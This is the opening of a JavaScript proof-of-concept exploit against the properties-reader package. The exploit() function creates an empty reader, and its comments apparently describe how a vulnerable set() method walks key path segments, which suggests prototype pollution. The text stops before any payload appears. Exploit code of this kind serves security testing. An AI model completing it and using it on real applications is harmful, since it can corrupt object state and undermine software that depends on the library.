const PropertiesReader = require('properties-reader');

async function exploit() {
  // Instantiate a reader with an empty configuration source for testing
  const reader = new PropertiesReader({});

  // The set() method parses the key into path segments.
  // In the vulnerable implementation, it resolves each segment against the current object
